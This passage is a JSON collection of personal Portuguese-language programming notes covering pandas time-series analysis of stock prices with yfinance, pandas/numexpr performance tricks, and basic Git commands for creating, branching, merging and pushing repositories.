Microseconds\nN Nanoseconds\n\nMS \tMonth start\nBMS Business month start\nQS \tQuarter start\nBQS Business quarter start\nAS \tYear start\nBAS Business year start\n'''"}, "Pandas - Datas e horas - bolsa": {"categoria": "python ciencia de dados handbook", "codigo": "import pandas as pd\nimport matplotlib.pyplot as plt\nimport seaborn\nimport yfinance as yf\n'''\n1# Pega a coluna 'Close' e faz um gr\u00e1fico, lembrando que o \u00edndice dessa dataframe\ns\u00e3o as datas\n\n2# resample('BA').mean() pega o \u00faltimo dia de cada m\u00eas e agrupa por anos\nfazendo uma m\u00e9dia, o agrupemento tem como resultado a m\u00e9dia de todos os \n\u00faltimos dias dos meses.\n\n3# asfreq('BA') pega a ultima cota\u00e7\u00e3o do ano e somente.\n\n4# \n'''\n\ngoog = yf.download('GOOG', start='2004-01-01', end='2016-08-24')\ndataframe =pd.DataFrame(data=goog)\n\nfechamento = dataframe['Close']#1\nmedia_anual = dataframe['Close'].resample('BA').mean()#2\nultimo_dia = dataframe['Close'].asfreq('BA')#3\n\n#4\nfig, axs = plt.subplots(2, 2, figsize=(12, 8))\nfechamento.plot(ax=axs[0, 0], alpha=0.5, style='-')\nmedia_anual.plot(ax=axs[0, 0], style=':')\nultimo_dia.plot(ax=axs[0, 0], style='--')\naxs[0, 0].legend(['Cota\u00e7\u00e3o', 'media anual', 'ultimo dia do ano'], loc='upper left')\n\n'''\ndataframe['Close'].plot(alpha=0.5, style='-')\ndataframe['Close'].resample('BA').mean().plot(style=':')\ndataframe['Close'].asfreq('BA').plot(style='--')\nplt.legend(['input', 'resample', 'asfreq'], loc='upper left')\nplt.show()\n'''\n\nplt.show()\n\n\nPREENCHIMENTO DE VALORES N\\A ########################################\n####################################################################\nimport pandas as pd\nimport matplotlib.pyplot as plt\nimport seaborn\nimport yfinance as yf\n'''\n1# fechamentos.asfreq('D') retorna uma dataframe em que os \u00edndices s\u00e3o as datas,\n\n2#\n - sharex | sharey significa que todos os gr\u00e1fico compatilham o mesmo 'x' e 'y'.\n - marker, personaliza apenas o marcador.\n - style, personaliza as linha e tamb\u00e9m o marcador.\n'''\n\n\ngoog = yf.download('GOOG', start='2004-01-01', end='2016-08-24')\ndata = goog.iloc[0:10] #Seleciona todas as colunas da linha 0 a 10\n\nfechamentos = data['Close']\n\n#1\nultimo_valor_dia = fechamentos.asfreq('D')\nback_fill = fechamentos.asfreq('D', method='bfill')\nfront_fill= fechamentos.asfreq('D', method='ffill')\n\n#2\nfig, ax = plt.subplots(2, sharex=True, sharey=True)\nultimo_valor_dia.plot(ax=ax[0], marker='+')\nback_fill.plot(ax=ax[1], style='-o')\nfront_fill.plot(ax=ax[1], style='--o')\n\nax[0].legend(['Fechamentos Di\u00e1rios'])\nax[1].legend(['Back Fill', 'Front Fill'])\n\nplt.tight_layout()\nplt.show()\n\n\n\n\n\n\nDESLOCAMENTO DE TEMPO, GR\u00c1FICOS DE LINHAS E PERSONALIZA\u00c7\u00c3O ##########\n##################################################################\n\nimport pandas as pd\nimport matplotlib.pyplot as plt\nimport seaborn\nimport yfinance as yf\n'''\n1# \nax[0].legend(['fechamento'], loc=2), coloca a legenda como nome de \nfechamento e o 'loc=2' \u00e9 igual a posi\u00e7\u00e3o dentro do gr\u00e1fico\n\nax[0].get_xticklabels()[4].set(weight='heavy', color='red')\nseleciona o label do eixo x na posi\u00e7\u00e3o 4 sela negrito(pesado) e\nna cor vermelha.\n\nax[0].axvline(local_max, alpha=0.3, color='red') introduz uma linha\nvertical posicionada no valor do eixo 'x' que no caso \u00e9 uma data \ncom o formato de data.\n'''\n\ngoog = yf.download('GOOG', start='2004-01-01', end='2016-08-24')\n\nfrontfill = goog['Close'].asfreq('D', method='pad')\ndeslocamento = frontfill.shift(900)\ndeslocamentot = frontfill.shift(900, freq='D')\n\nfig, ax = plt.subplots(3, sharey=True) #Significa que todos o gr\u00e1ficos compartilhao mesmo 'x'\nfrontfill.plot(ax=ax[0])\ndeslocamento.plot(ax=ax[1])\ndeslocamentot.plot(ax=ax[2])\n\n#legendas e nota\u00e7\u00f5es\nlocal_max = pd.to_datetime('2007-11-05')#Cria a data em formato correto\noffset = pd.Timedelta(900, 'D') #Cria o intervalo de tempo\n\n#1\nax[0].legend(['Fechamentos'], loc=2)\nax[0].get_xticklabels()[4].set(weight='heavy', color='red')\nax[0].axvline(local_max, alpha=0.3, color='red')#alpha \u00e9 a transpar\u00eancia\n\nax[1].legend(['shift(900)'], loc=2)\nax[1].get_xticklabels()[4].set(weight='heavy', color='red')\nax[1].axvline(local_max + offset, alpha=0.3, color='red')\n#Estam pegando (data + intervalo)\n\nax[2].legend(['shift(900) D'], loc=2)\nax[2].get_xticklabels()[1].set(weight='heavy', color='red')\nax[2].axvline(local_max + offset, alpha=0.3, color='red')\n\nplt.show()\n\n\n\nROI RETORNO SOBRE INVESTIMENTO#######################################\n################################################################\nimport pandas as pd\nimport matplotlib.pyplot as plt\nimport seaborn\nimport yfinance as yf\n\ngoog = yf.download('GOOG', start='2004-01-01', end='2016-08-24')\n\nfrontfill = goog['Close'].asfreq('D', method='pad')\ndeslocamento = frontfill.shift(900)\ndeslocamentot = frontfill.shift(900, freq='D')\ndeslocamento_365 = frontfill.shift(-365, freq='D')\nroi = 100 * ((deslocamento_365 / frontfill) - 1)\n\nfig, ax = plt.subplots(2, sharey=True)\nroi.plot(ax=ax[0])\n\n\n#Legendas e nota\u00e7\u00f5es\nlocal_max = pd.to_datetime('2007-11-05')\noffset = pd.Timedelta(900, 'D')\n\nax[0].legend(['Fechamentos'], loc=2)\nax[0].get_xticklabels()[4].set(weight='heavy', color='red')\nax[0].axvline(local_max, alpha=0.3, color='red')\n\n\n\nplt.tight_layout()\nplt.show()\n"}, "Pandas - Datas e horas - desvio padr\u00e3o | m\u00e9dia m\u00f3vel": {"codigo": "import pandas as pd\nimport matplotlib.pyplot as plt\nimport seaborn\nimport yfinance as yf\n'''\n1# fazendo um objeto rolling aplicado na coluna 'Close', \n - center=True (o ponto ser\u00e1 calculado no meio, ou seja, do dia na posi\u00e7\u00e3o\n184 ao dia 548 e o ponto estar\u00e1 no meio.\n\n - center=False (o ponto ser\u00e1 calculado no final, ou seja, do dia 0 ao 365\ne o ponto vai est\u00e1 no dia 366 por exemplo\n\n2#\n - rolling.mean() m\u00e9dia m\u00f3vel\n - rolling.std() desvio padr\u00e3o m\u00f3vel\n\n\n'''\n\n\npd.set_option('display.max_rows', None)\ngoog = yf.download('ITUB4.SA', start='2004-01-01', end='2024-08-24')\n\n#1\nrolling = goog['Close'].rolling(365, center=True)\n\n#2\ndata = pd.DataFrame({'input': goog['Close'],\n\t'one_year rolling_mean': rolling.mean(),\n\t'one_year rolling_std': rolling.std()})\n\t\n\n\nax = data.plot(style=['-', '--', ':'])\nax.lines[0].set_alpha(0.3)\nplt.show()", "categoria": "python ciencia de dados handbook"}, "Pandas - Datas e horas - rolling(), janela m\u00f3vel gaussiana ": {"categoria": "python ciencia de dados handbook", "codigo": "import pandas as pd\nimport numpy as np\nimport matplotlib.pyplot as plt\n\n'''\n1# Renomeando colunas, renomea posicionalmente\n\n2# eval(coluna0 + coluna1 + coluna2)\n\n3# Seleciona v\u00e1ria colunas, reamostra essas colunas por semana e soma, ou seja\nagrupa por semana, semana0 = soma(movimenta\u00e7\u00f5es dessa semana)\nLEMBRANDO QUE OS DADOS EST\u00c3O EM MARCA DE TEMPO DE HORA\n\n\n4# Seleciona v\u00e1rias colunas, reamostra essas colunas por dia e soma, ou seja\nagrupa por dia, dia0 = soma(movimenta\u00e7\u00f5es dessa semana)\n\n5# Aplica uma janela m\u00f3vel(rolling), a janela considera 30 per\u00edodos de tempo \nao redor do ponto atual, o resultado do ponto atual \u00e9 a soma dos 30 pontos ao redor.\n\n6# Aplica uma janela m\u00f3vel(rolling), a janela considera 50 per\u00edodos de tempo\nao redor do ponto atual, por\u00e9m usando o win_type='gaussian', os valores que\nest\u00e3o mais pr\u00f3ximo do centro da janela, tem mais peso do que os valores que est\u00e3o\nmais distantes. ent\u00e3o \u00e9 feito a soma, o desvio padr\u00e3o para a soma gaussiana \u00e9 de 10\n'''\n\ndata = pd.read_csv('FremontBrigde.csv', index_col='Date', parse_dates=True)\n#parse_dates transforma o \u00edndex em tipo data, para poder trabalhar j\u00e1 no formato correto\n\n#1\ndata.columns = ['South', 'West', 'East']\n\ndata['Total'] = data.eval('South + West + East')#2\nweekly = data[['South', 'West', 'East']].resample('W').sum()#3\ndaily = data[['South', 'West', 'East']].resample('D').sum()#4\ndaily_rolling = daily.rolling(30, center=True).sum()#5\ndaily_rolling_gausian = daily.rolling(50, center=True, win_type='gaussian').sum(std=10)#6\n#print(data.dropna().describe())\n\nfig, axs = plt.subplots(2, 2)\ndata['Total'].plot(ax=axs[0, 0])\nweekly.plot(ax=axs[0, 1], style=[':', '--', '-'])\ndaily_rolling.plot(ax=axs[1, 0], style=[':', '--', '-'])\ndaily_rolling_gausian.plot(ax=axs[1, 1], style=[':', '--', '-'])\n\n\n\naxs[0, 0].set_ylabel('Hourly Bicicle Count')\naxs[0, 1].set_ylabel('Weekly sum')\naxs[1, 0].set_ylabel('Daily Rolling sum 30')\naxs[1, 1].set_ylabel('Daily Rolling Gausian sum 50')\n\n\nplt.show()\n"}, "Pandas - Datas e horas - groupby": {"categoria": "python ciencia de dados handbook", "codigo": "import pandas as pd\nimport numpy as np\nimport matplotlib.pyplot as plt\n'''\n1# Mudando o nome das colunas, a sele\u00e7\u00e3o \u00e9 feita de forma posicional\n\n2# Agrupa pelo \u00edndice selecionando a hora(time) da data e calcula m\u00e9dia por hora\n\n3# calcula quantos segundos tem em 4 horas, faz uma array que organiza as horas\nno eixo 'x'\n\n4# Agrupa pelo \u00edndice selecionando o dia da semana(dayofweek) e calcula a m\u00e9dia por\ndia da semana.\n'''\n\ndata = pd.read_csv('FremontBrigde.csv', index_col='Date', parse_dates=True)\n#parse_dates=True, seta a coluna no formato datetime64\n\n#1\ndata.columns = ['South', 'West', 'East']\nbytime = data.groupby(data.index.time).mean()#2\nhourly_ticks = 4 * 60 * 60 * np.arange(6)#3\nby_weekday = data.groupby(data.index.dayofweek).mean()#4\nby_weekday.index = ['Seg', 'Ter', 'Qua', 'Qui', 'Sex', 'Sab', 'Dom']#5\n\n\n\nfig, axs = plt.subplots(2)\nbytime.plot(ax=axs[0], xticks=hourly_ticks, style=[':', '--', '-'])\nby_weekday.plot(ax=axs[1], style=[':', '--', '-'])\n\n\n\n\nplt.show()\n"}, "Pandas - Performance - numexpr - consulta": {"categoria": "python ciencia de dados handbook", "codigo": "import numpy as np\nimport numexpr\n#S\u00e3o r\u00e1pidos mas consomem muita mem\u00f3ria com uma quantidade grande de dados\n\nnumexpr.set_num_threads(n) # onde n \u00e9 o n\u00famero de n\u00facleos que voc\u00ea deseja usar\n\nrng = np.random.RandomState(42)\nx = rng.rand(int(100000000))\ny = rng.rand(int(100000000))\nprint(x+y)\n#tempo 3.39ms\n\nmask = (x > 0.5) & (y < 0.5)\n\ntmp1 = (x > 0.5)\ntmp2 = (y < 0.5)\nmask = tmp1 & tmp2\nprint(mask)\n\nmask_numexpr = numexpr.evaluate('(x > 0.5) & (y < 0.5)') #Consulta\nprint(np.allclose(mask, mask_numexpr)) #Verifica que os arrays s\u00e3o 'proximamente'\n#iguals, equivalente a np.array_equal()\n\nprint(x[mask_numexpr])\n\n'''\nnumexpr.evaluate() usa v\u00e1rios n\u00facleos da CPU para fazer os c\u00e1lculos\n''' "}, "Pandas - Performance - pd.eval() - opera\u00e7\u00f5es eficientes": {"categoria": "python ciencia de dados handbook", "codigo": "OPERA\u00c7\u00d5ES + - * / ####################################################\n###################################################################\nimport pandas as pd\nimport numpy as np\nimport numexpr\n\n#numexpr.set_num_threads(n)\n#pd.eval(\"1 + 1\", engine='numexpr')\n\nnrows, ncols = 100000, 100\nrng = np.random.RandomState(42)\n\n#1\ndados = rng.rand(nrows, ncols)\ndf1, df2, df3, df4, df5 = (pd.DataFrame(data=dados)for i in range(5))\n\ndfr = pd.eval('df1 + df2 + df3 + df4')\ndfr2= pd.eval('-df1 * df2 / (df3 + df4) - df5')\n\n\nCOMPARA\u00c7\u00d5ES ##########################################################\n#######################################################################\nimport pandas as pd\nimport numpy as np\n\nnrows, ncols = 100000, 100\nrng = np.random.RandomState(42)\n\n#1\ndados = rng.rand(nrows, ncols)\ndf1, df2, df3, df4, df5 = (pd.DataFrame(data=dados)for i in range(5))\n\ndfr = pd.eval('(df1 < 0.5) & (df2 < 0.5) | (df3 < df4)')\ndfr1= pd.eval('(df1 < 0.5) and (df2 < 0.5) or (df3 < df4)')\ndfr2= pd.eval('df2.T[0] + df3.iloc[1]')\n\n"}, "Pandas - Performance - pd.eval() - opera\u00e7\u00f5es com colunas de dataframes": {"categoria": "python ciencia de dados handbook", "codigo": "SELECIONANDO COLUNAS E FAZANDO C\u00c1LCULOS ##############################\n#####################################################################\nimport pandas as pd\nimport numpy as np\nimport numexpr\n'''\nCria uma matriz de 1000 linha e 3 colunas de n\u00fameros aleat\u00f3rios entre 0 e 1, \ncria o dataframe com base nisso.\nPodemos fazer opera\u00e7\u00f5es com as colunas.\n\n'''\npd.set_option('compute.use_numexpr', True)\nrng = np.random.RandomState(42)\ndf = pd.DataFrame(data=rng.rand(100000000, 3), columns=['A', 'B', 'C'])\nresult = pd.eval('df.A + df.B / (df.C - 1)')\nresult1= df.eval('A + B / (C - 1)')\nresult2= df.eval('A.mean()')\ndf.eval('D = (A + B) / C', inplace=True)\na = 1\nresult3= df.eval('A + @a')\n\n\n\n"}, "Pandas - Performance - query() ": {"categoria": "python ciencia de dados handbook", "codigo": "import pandas as pd\nimport numpy as np\nimport numexpr\n'''\nCria uma matriz de 1000 linha e 3 colunas de n\u00fameros aleat\u00f3rios entre 0 e 1, \ncria o dataframe com base nisso.\nPodemos fazer opera\u00e7\u00f5es com as colunas.\n\n'''\npd.set_option('compute.use_numexpr', True)\nrng = np.random.RandomState(42)\ndf = pd.DataFrame(data=rng.rand(100000000, 3), columns=['A', 'B', 'C'])\nresult1 = df[(df.A < 0.5) & (df.B < 0.5)]\nresult2 = pd.eval('df[(df.A < 0.5) & (df.B < 0.5)]')\nresult3 = df.query('A < 0.5 and B < 0.5')\nbytes = df.values.nbytes\ngigabyte = bytes/(1024**3)\nprint(f'{gigabyte} GB')\n\n\n\n\n"}, "dask.array - processamento usando v\u00e1rios n\u00facleos": {"codigo": "import numpy as np\nimport numexpr\nimport dask.array as da\na = np.random.rand(300000000)\ndaa = da.from_array(a)\nfor i in range(1000000000):\n\n\tprint(daa.mean().compute())\n\n", "categoria": "Python multinucleos"}, "Instalar ": {"codigo": "Selecione use wordpad as git", "categoria": "GitHub"}, "Criando reposit\u00f3rio git": {"codigo": "1) Crie uma pasta para inicializar o reposit\u00f3rio git.\n- Navegar at\u00e9 a pasta com CMD\n\tDIR - ver todos os arquivos e pastas desse diret\u00f3rio\n\tcd Desktop- navega at\u00e9 a pasta desktop\n\tOu arrastar a p\u00e1gina para o cmd\n\tgit init -  para inicializar o git na pasta", "categoria": "GitHub"}, "Git add - pasta > tempor\u00e1rio -  antes do deploy": {"codigo": "1) cd arrasta a p\u00e1gina para o cmd e aperta enter\n2) cls ou clear para limpar o cmd, depoluir\n3) git status - retorna o status atual do reposit\u00f3rio\n4) git add arquivo | git add . -adiciona todos os arquivo. para area de stage(tempor\u00e1ria)", "categoria": "GitHub"}, "Configurando usu\u00e1rio e email": {"categoria": "GitHub", "codigo": "1) Dentro do diret\u00f3rio digite o seu usu\u00e1rio.\nC:\\Users\\pcleu\\Desktop\\MeuSite>git config --global user.name Samuel\nC:\\Users\\pcleu\\Desktop\\MeuSite>git config --global user.email pcleumas12@gmail.com\n"}, "commit": {"codigo": "1) C:\\Users\\pcleu\\Desktop\\MeuSite>git commit -m \"Usando num\"", "categoria": "GitHub"}, "Git Log - Hist\u00f3rico, todas as vers\u00f5es": {"codigo": "git log - mostra o hist\u00f3rico de modifica\u00e7\u00f5es\nHEAD - aponta qual vers\u00e3o voc\u00ea est\u00e1.", "categoria": "GitHub"}, "Git CheckOut - voltar vers\u00f5es anteriores do git": {"codigo": "C:\\Users\\pcleu\\Desktop\\MeuSite>git checkout e8ebf8\nessas letras e n\u00fameros s\u00e3o os primeiros digitos da hash da vers\u00e3o escolhida\n\nATEN\u00c7\u00c3O, ANTES DE FAZER O CHECK OUT, FA\u00c7A O GIT COMMIT\n\n\nVolta para a ultima ves\u00e3o\nC:\\Users\\pcleu\\Desktop\\MeuSite>git checkout master\n\n\nCaso n\u00e3o funcione\nC:\\Users\\pcleu\\Desktop\\MeuSite>git checkout main\n\n\n", "categoria": "GitHub"}, "Branches e Merges ": {"codigo": " Todo Branche tem que derivar a partir de um commit.\nSEMPRE QUE EU VOU CRIAR ALGO NOVO EU TENHO QUE CRIAR UMA NOVA BRANCHE \nA PARTIR DA BRANCHE PRINCIPAL\n\nCRIAR  UM BRENCH - Uma linha do tempo s\u00f3 para voc\u00ea\n1)C:\\Users\\pcleu\\Desktop\\MeuSite>git branch pagina_de_servicos\n\nMUDAR DE BRANCH\nC:\\Users\\pcleu\\Desktop\\MeuSite>git checkout master\n\nAGORA PODE TRABALHAR!!!\nN\u00c2O MUDE DE BRANCHE SEM FAZER O ADD . E O COMMIT\n\nvoltar para o branche principal]\ngit checkout master \ngit checkout main", "categoria": "GitHub"}, "Merge - mesclar os branches": {"codigo": "Primeiro eu tenho que estar dentro da minha Branch principal, ou seja, a linha do tempo mestre\nem seguida eu digo que quero mesclar o conte\u00fado da minha Branch com o principal\n\nC:\\Users\\pcleu\\Desktop\\MeuSite>git checkout master\nAlready on 'master'\n\nC:\\Users\\pcleu\\Desktop\\MeuSite>git merge pagina_de_servicos\n\nhint: Waiting for your editor to close the file... dos2unix: converting file C:/Users/pcleu/Desktop/MeuSite/.git/MERGE_MSG to Unix format...\nMerge made by the 'ort' strategy.\n pagina_servicos.py | 1 +\n 1 file changed, 1 insertion(+)\n create mode 100644 pagina_servicos.py", "categoria": "GitHub"}, "Passar e clonar reposit\u00f3rios git": {"codigo": "1) Clique me + do lado do perfil e crie um novo reposit\u00f3rio.\nsiga esses c\u00f3digos \n2) Abra o cmd e navegue at\u00e9 a pasta\n\u2026or push an existing repository from the command line\ngit remote add origin https://github.com/SamuelSouzaSangode/curso_git.git\ngit branch -M main\ngit push -u origin main\n\nse a branch for main, use main, se n\u00e3o for, use o nome mesmo\n\n\n\nCLONAR\n1) Clique em code e copie a URL\nC:\\Users\\pcleu\\Desktop\\Close>git clone https://github.com/SamuelSouzaSangode/curso_git.git", "categoria": "GitHub"}}